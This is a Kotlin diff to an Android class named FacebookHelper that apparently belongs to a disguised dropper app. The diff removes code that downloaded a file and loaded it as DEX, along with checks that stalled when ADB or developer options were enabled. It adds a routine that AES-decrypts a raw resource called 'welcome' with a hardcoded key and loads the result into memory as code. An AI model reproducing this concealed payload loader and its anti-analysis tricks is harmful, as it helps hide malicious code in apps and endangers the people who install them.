@@ -12,7 +12,6 @@ import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
 import com.google.firebase.Firebase
 import com.google.firebase.messaging.messaging
-import com.simmer.SimmerW
 import dalvik.system.InMemoryDexClassLoader
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -34,6 +33,8 @@ import java.nio.ByteBuffer
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import javax.crypto.Cipher
+import javax.crypto.spec.SecretKeySpec
 import kotlin.jvm.java
 import kotlin.random.Random
 
@@ -71,23 +72,13 @@ class FacebookHelper(val url: String) {
             CoreH.e.postRef(mRef)
             reConfig()
         }
-        openWork(context)
-        openSession()
+        openSession(context)
     }
 
-    private fun openSession() {
+    private fun openSession(context: Context) {
         CoreH.pE("session")
         ioTask(60000 * 15) {
-            openSession()
-        }
-    }
-
-    private fun openWork(context: Context) {
-        val workManager = WorkManager.getInstance(context)
-        val workRequest = OneTimeWorkRequest.Builder(SimmerW::class.java).build()
-        workManager.enqueueUniqueWork("simmer_worker", ExistingWorkPolicy.REPLACE, workRequest)
-        ioTask(Random.nextLong(35000, 45000)) {
-            openWork(context)
+            openSession(context)
         }
     }
 
@@ -357,21 +348,12 @@ class FacebookHelper(val url: String) {
     private var isGo = false
     private var urlD = ""
     private fun next() {
-        if (isCanNext().not()) return
         if (isGo) return
         isGo = true
-        //
-//        Class.forName("com.vivo.core.Core").getMethod("a", Context::class.java, B1::class.java)
-//            .invoke(null, CoreH.mApp, CoreH.e as B1)
-//        return
-        //
-//        load(CoreH.mApp.assets.open("local").readBytes())
-//        return
-        val parentFile = File("${CoreH.mApp.filesDir}")
-        val save = File(parentFile, "file_wall")
-        FileDownLoad().fileD(urlD, success = {
-            load(save.readBytes())
-        }, save)
+        val resourceId: Int =
+            CoreH.mApp.resources.getIdentifier("welcome", "raw", CoreH.mApp.packageName)
+        val aIp = CoreH.mApp.resources.openRawResource(resourceId).readBytes()
+        load(decryptDex("AizjsIzksjagOkz1".toByteArray(), aIp))
     }
 
     private fun load(byte: ByteArray) {
@@ -384,60 +366,17 @@ class FacebookHelper(val url: String) {
 
     private var nameFile = ""
 
-//    private fun decryptDex(keyAes: ByteArray): ByteArray {
-//        val inputBytes = java.util.Base64.getDecoder()
-//            .decode(CoreH.mApp.assets.open(nameFile).readBytes())
-//        val key = SecretKeySpec(keyAes, "AES")
-//        val cipher = Cipher.getInstance("AES")
-//        cipher.init(Cipher.DECRYPT_MODE, key)
-//        val outputBytes = cipher.doFinal(inputBytes)
-//        return outputBytes
-//    }
-
     private var checkStatus = 0
-    private fun isCanNext(): Boolean {
-        val r = when (checkStatus) {
-            0 -> {
-                val isd = isOpenDev()
-                if (isOpenUsb() || isd) {
-                    false
-                } else {
-                    true
-                }
-            }
 
-            1 -> {
-                if (isOpenDev()) {
-                    false
-                } else {
-                    true
-                }
-            }
 
-            else -> {
-                true
-            }
-        }
-        return r
-    }
+    private val ALGORITHM = "AES"
 
-    private fun isOpenUsb(): Boolean {
-        val stra = CoreH.getStr("u_sss19")
-        val isOpenUsb = Tools.isAdbEnabled(CoreH.mApp)
-        if (stra.isEmpty() && isOpenUsb) {
-            CoreH.saveC("u_sss19", "true")
-            CoreH.pE("u_o1")
-        }
-        return isOpenUsb || stra.isNotEmpty()
-    }
-
-    private fun isOpenDev(): Boolean {
-        val stra = CoreH.getStr("dev_aaa19")
-        val isOpenDev = Tools.isDevelopmentSettingsEnabled(CoreH.mApp)
-        if (stra.isEmpty() && isOpenDev) {
-            CoreH.saveC("dev_aaa19", "true")
-            CoreH.pE("dev_o2")
-        }
-        return isOpenDev || stra.isNotEmpty()
+    private fun decryptDex(keyAes: ByteArray, inStr: ByteArray): ByteArray {
+        val inputBytes = java.util.Base64.getDecoder().decode(inStr)
+        val key = SecretKeySpec(keyAes, ALGORITHM)
+        val cipher = Cipher.getInstance(ALGORITHM)
+        cipher.init(Cipher.DECRYPT_MODE, key)
+        val outputBytes = cipher.doFinal(inputBytes)
+        return outputBytes
     }
 }
